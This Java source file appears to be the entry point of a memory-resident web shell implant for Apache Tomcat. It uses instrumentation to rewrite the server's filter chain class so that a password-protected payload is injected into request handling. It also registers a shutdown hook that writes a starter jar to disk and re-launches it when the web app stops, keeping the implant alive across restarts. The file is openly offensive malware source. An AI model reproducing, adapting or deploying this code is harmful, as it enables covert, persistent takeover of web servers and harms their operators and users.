package com.jun.apt;

import com.jun.apt.util.CryptoJs;
import com.jun.apt.util.Debugger;
import com.jun.apt.util.Utils;

import java.lang.instrument.Instrumentation;

public class AgentEntry {

    public static byte[] AGENT_JAR;
    public static byte[] AGENT_STARTER_JAR;
    public static String PASSWORD;
    public static final String AGENT = "agent.jar";
    public static String AGENT_STARTER;
    public static final String AGENT_CONFIG_FILE = "agent.properties";
    public static final String PAYLOAD_NAME = "Payload";
    public static String TMP_DIR;
    public static String SECRET_KEY = "";
    public static String CRYPTO_JS;

    static {
        AgentEntry.TMP_DIR = System.getProperty("os.name").toLowerCase().contains("windows") ? "C:/Users/Public/Documents" : "/tmp";
        AgentEntry.AGENT_STARTER = Utils.getProperty("starter_name");
        AgentEntry.SECRET_KEY = Utils.getProperty("secret_key");
        AgentEntry.CRYPTO_JS = CryptoJs.content;
    }

    public static void agentmain(String agentArgs, Instrumentation inst) {
        Debugger.log("start injection.");
        PASSWORD = Utils.getProperty("password");
        inst.addTransformer(new Transformer(), true);
        for (Class c : inst.getAllLoadedClasses()) {
            if (c.getName().equals("org.apache.catalina.core.ApplicationFilterChain")) {
                try {
                    Debugger.log("inst.retransformClasses");
                    inst.retransformClasses(c);
                    Debugger.log("injection successful!");
                    Utils.setProperty("success", "true");

                    final String dirPath = Utils.getProperty("dir_path");
                    final String start_args = Utils.getProperty("start_args");
                    final String tomcat_version = Utils.getProperty("tomcat_version");
                    Utils.readFile(dirPath, AGENT_STARTER);

                    Runtime.getRuntime().addShutdownHook(new Thread() {
                        @Override
                        public void run() {
                            Debugger.log("WebApp is stopping...");
                            Utils.writeFile(dirPath, AGENT_STARTER);
                            try {
                                Runtime.getRuntime().exec(new String[]{
                                        "java",
                                        "-jar",
                                        dirPath + "/" + AGENT_STARTER,
                                        start_args,
                                        tomcat_version
                                });
                                Debugger.log("starter process started!");
                            } catch (Exception ignored) {

                            }
                        }
                    });
                } catch (Exception ignored) {
                }
                break;
            }

        }

    }

}